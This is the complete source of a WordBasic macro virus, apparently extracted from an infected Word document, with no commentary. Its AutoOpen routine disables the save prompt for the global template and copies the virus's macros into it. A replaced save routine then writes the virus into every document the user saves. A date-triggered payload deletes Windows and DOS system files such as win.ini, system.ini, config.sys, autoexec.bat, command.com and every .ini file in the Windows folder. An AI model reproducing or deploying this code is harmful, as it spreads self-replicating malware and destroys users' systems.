   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Datumz
   Dim m$
   If Datumz = 35493 Then WordBasic.OnTime "12:00", "abc", 0
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   m$ = WordBasic.[FileName$]() + ":RED"
   WordBasic.MacroCopy m$, "Global:DateiSpeichern"
   m$ = WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy m$, "Global:RED"
   m$ = WordBasic.[FileName$]() + ":abc"
   WordBasic.MacroCopy m$, "Global:abc"
   End Sub

   Attribute VB_Name = "RED"

   Public Sub MAIN()
   Dim m$
   m$ = WordBasic.[FileName$]() + ":abc"
   WordBasic.MacroCopy "Global:abc", m$
   m$ = WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:RED", m$
   m$ = WordBasic.[FileName$]() + ":RED"
   WordBasic.MacroCopy "Global:DateiSpeichern", m$
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   End Sub

   Attribute VB_Name = "abc"

   Public Sub MAIN()
   SetAttr "C:\windows\system.ini", 33
   SetAttr "C:\windows\system.ini", 0
   WordBasic.Kill "C:\Windows\system.ini"
   SetAttr "C:\windows\win.ini", 33
   SetAttr "C:\windows\win.ini", 0
   WordBasic.Kill "C:\windows\win.ini"
   SetAttr "C:\windows\Netdet.ini", 33
   SetAttr "C:\windows\netdet.ini", 0
   WordBasic.Kill "C:\windows\netdet.ini"
   If WordBasic.[Files$]("Config.sys") <> "" Then
       SetAttr "C:\windows\Config.sys", 33
       SetAttr "C:\windows\config.sys", 0
       WordBasic.Kill "C:\config.sys"
   End If
   If WordBasic.[Files$]("autoexec.bat") <> "" Then
       SetAttr "C:\windows\autoexec.bat", 33
       SetAttr "C:\windows\autoexec.bat", 0
       WordBasic.Kill "C:\autoexec.bat"
   End If
   SetAttr "C:\windows\Command.com", 33
   SetAttr "C:\windows\Command.com", 0
   WordBasic.Kill "C:\command.com"
   WordBasic.Kill "C:\windows\*.ini"
   End Sub
